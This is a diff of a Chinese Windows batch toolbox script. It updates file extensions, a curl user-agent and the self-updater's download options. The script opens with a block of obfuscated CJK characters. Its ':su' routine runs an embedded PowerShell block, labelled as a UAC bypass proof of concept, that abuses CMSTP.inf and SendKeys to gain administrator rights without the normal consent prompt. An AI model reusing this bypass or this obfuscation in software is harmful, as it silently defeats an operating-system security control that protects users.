@@ -15,7 +15,7 @@
 樰樹樴獯朵摨汵猷乇晡挰唱戸杨漳刴湔爲灈洊潑欸代副愱佪灣桴摓
 桃灤桌焸爷椷瀱併佦摰扊灤慳浡制漰橓椱晅瑡楈戸吴丹卂儳杆匵樊
 唷栶匴匶瑊挵住汯呱略牪朳愸瀴昱何瑒执啎爊昷獭汉浇卅估昷渳灆
-					
+						
 :chushihua
 @if not "%os%" == "Windows_NT" goto winnt
 @echo off&title 　&setlocal enabledelayedexpansion
@@ -51,7 +51,7 @@ setlocal
 set "dosqssj=!time!"
 >nul chcp 936
 set ver=20250601
-set versize=154810
+set versize=154560
 set xz0=0
 set nx1=[+]下一页
 set nx2=[-]上一页
@@ -2271,7 +2271,7 @@ call :var txnrsj
 cls
 if not exist "%temp%\DOS工具箱临时目录" (call :md "%temp%\DOS工具箱临时目录")
 >"%temp%\DOS工具箱临时目录\说明.txt" echo;该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！
->"%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.bat" (
+>"%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.cmd" (
 echo;@echo off
 echo;title !txnrmc!
 echo;color f1
@@ -2284,8 +2284,8 @@ echo;echo;生成时间:!date:~0,4!年!date:~5,21月!date:~8,21日 !xingqi!!time:~0,8!
 echo;%hx%
 echo;echo;按任意键退出^&^>nul pause
 )
-schtasks /create /tn "!txnrmc!" /tr "%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.bat" /st !txnrsj! /sd !txnrrq! /sc once&&echo;任务将在!txnrrq! !txnrsj!运行
-echo;提醒文件已保存至"%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.bat"
+schtasks /create /tn "!txnrmc!" /tr "%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.cmd" /st !txnrsj! /sd !txnrrq! /sc once&&echo;任务将在!txnrrq! !txnrsj!运行
+echo;提醒文件已保存至"%temp%\DOS工具箱临时目录\!txnrmc! - 定时提醒文件.cmd"
 %hx%
 %pause%
 endlocal
@@ -2312,9 +2312,9 @@ call :var dsyxsj
 cls
 if not exist "%temp%\DOS工具箱临时目录" (call :md "%temp%\DOS工具箱临时目录")
 >"%temp%\DOS工具箱临时目录\说明.txt" echo;该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！
->"%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.bat" echo;"!dsyxlj!"
-schtasks /create /tn "!dsyxmc!" /tr "%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.bat" /st !dsyxsj! /sd !dsyxrq! /sc once&&echo;任务将在!dsyxrq! !dsyxsj!运行
-echo;启动文件已保存至"%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.bat"
+>"%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.cmd" echo;"!dsyxlj!"
+schtasks /create /tn "!dsyxmc!" /tr "%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.cmd" /st !dsyxsj! /sd !dsyxrq! /sc once&&echo;任务将在!dsyxrq! !dsyxsj!运行
+echo;启动文件已保存至"%temp%\DOS工具箱临时目录\!dsyxmc! - 定时运行文件.cmd"
 %hx%
 %pause%
 endlocal
@@ -2337,9 +2337,9 @@ set /p "rwsc=输入要删除的任务名称: "
 call :var rwsc
 cls
 schtasks /delete /tn "!rwsc!" /f
-del /f /q "%temp%\DOS工具箱临时目录\!rwsc! - 定时提醒文件.bat";^
-		"%temp%\DOS工具箱临时目录\!rwsc! - 定时运行文件.bat"
->nul 2>nul dir /a /s "%temp%\DOS工具箱临时目录\*.bat"||rd /s /q "%temp%\DOS工具箱临时目录"
+del /f /q "%temp%\DOS工具箱临时目录\!rwsc! - 定时提醒文件.cmd";^
+		"%temp%\DOS工具箱临时目录\!rwsc! - 定时运行文件.cmd"
+>nul 2>nul dir /a /s "%temp%\DOS工具箱临时目录\*.cmd"||rd /s /q "%temp%\DOS工具箱临时目录"
 %hx%
 %pause%
 endlocal
@@ -4180,7 +4180,7 @@ if not exist "!windir!\system32\curl.exe" (
 :71.1
 cls
 set "doh=--doh-url https://101.101.101.101/dns-query"
-set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
+set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36""
 set filename=
 set url=
 set /p "url=输入下载链接(e=返回): "
@@ -4963,16 +4963,17 @@ setlocal
 cls
 title 更新DOS工具箱 - 当前版本: !ver!!system!
 set "doh=--doh-url https://101.101.101.101/dns-query"
-set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
+set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36""
+set "curlpix=--compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10"
 set resolve=--resolve raw.github.io:443:^
-185.199.110.133,^
-185.199.109.133,^
-185.199.111.133,^
 185.199.108.133,^
-2606:50c0:8001::154,^
-2606:50c0:8003::154,^
+185.199.109.133,^
+185.199.110.133,^
+185.199.111.133,^
 2606:50c0:8000::154,^
-2606:50c0:8002::154
+2606:50c0:8001::154,^
+2606:50c0:8002::154,^
+2606:50c0:8003::154
 set "jshost=-H "host: cdn.jsdelivr.net""
 set "githost=-H "host: raw.githubusercontent.com""
 set "gxurlhost1=https://raw.github.io/Trustedinstall/dostool/main/update.js"
@@ -4990,7 +4991,7 @@ if exist "!windir!\system32\curl.exe" (
 	call :curlproxy
 	echo;使用链接:	!gxurlhost1!
 	echo;Host域名:	!githost:~10,-1!
-	curl !proxy! !doh! !githost! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 !resolve! -o dostoolupdate "!gxurlhost1!"
+	curl !proxy! !doh! !githost! !ua! !curlpix! !resolve! -o dostoolupdate "!gxurlhost1!"
 	if exist "%temp%\dostoolupdate" (
 		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
 			set "gxver=%%a"
@@ -5003,7 +5004,7 @@ if exist "!windir!\system32\curl.exe" (
 		goto updatecheck
 	) else (
 		echo;使用链接:	!gxurl1!
-		curl !proxy! !doh! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 -o dostoolupdate "!gxurl1!"
+		curl !proxy! !doh! !ua! !curlpix! -o dostoolupdate "!gxurl1!"
 		if exist "%temp%\dostoolupdate" (
 			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
 				set "gxver=%%a"
@@ -5018,7 +5019,7 @@ if exist "!windir!\system32\curl.exe" (
 		) else (
 			echo;使用链接:	!gxurlhost2!
 			echo;Host域名:	!jshost:~10,-1!
-			curl !proxy! !doh! !jshost! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 !resolve! -o dostoolupdate "!gxurlhost2!"
+			curl !proxy! !doh! !jshost! !ua! !curlpix! !resolve! -o dostoolupdate "!gxurlhost2!"
 			if exist "%temp%\dostoolupdate" (
 				for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
 					set "gxver=%%a"
@@ -5031,7 +5032,7 @@ if exist "!windir!\system32\curl.exe" (
 				goto updatecheck
 			) else (
 				echo;使用链接:	!gxurl2!
-				curl !proxy! !doh! !ua! --compressed --remove-on-error -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 3 --max-time 10 -o dostoolupdate "!gxurl2!"
+				curl !proxy! !doh! !ua! !curlpix! -o dostoolupdate "!gxurl2!"
 				if exist "%temp%\dostoolupdate" (
 					for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
 						set "gxver=%%a"
@@ -5467,11 +5468,11 @@ set "qrgb=!qrgb:.=;!"
 <nul set /p "=!cswz!48;2;!brgb!;38;2;!qrgb!m%~3!cswz!!ysbak!"
 goto :eof
 :su
->"%temp%\su.bat" <nul set /p "=!comspec! /c "%~dpnx0" ks"
+>"%temp%\su.cmd" <nul set /p "=!comspec! /c "%~dpnx0" ks"
 powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('%~dpnx0') -split '#su\#.*'; iex ($command[1])"
 rem 延迟删除文件确保能被上一条指令读取
 call :out 1
-del /f /q "%temp%\su.bat";"%Temp%\CMSTP.inf"
+del /f /q "%temp%\su.cmd";"%Temp%\CMSTP.inf"
 exit 0
 #su#
 #UAC Bypass poc using SendKeys
@@ -5481,7 +5482,7 @@ Function Set-INFFile {
 		[Parameter(HelpMessage="Specify the INF file location")]
 		$InfFileLocation = "$env:temp\CMSTP.inf",
 		[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-		[String]$CommandToExecute = "$env:temp\su.bat"
+		[String]$CommandToExecute = "$env:temp\su.cmd"
 	)
 	$InfContent = @"
 [version]
@@ -6246,7 +6247,7 @@ set "filename=%~3"
 set "dir=%~4"
 set "par=%~5"
 set "doh=--doh-url https://101.101.101.101/dns-query"
-set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36""
+set "ua=-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36""
 if not defined url (
 	echo;链接不能为空!
 	goto :eof
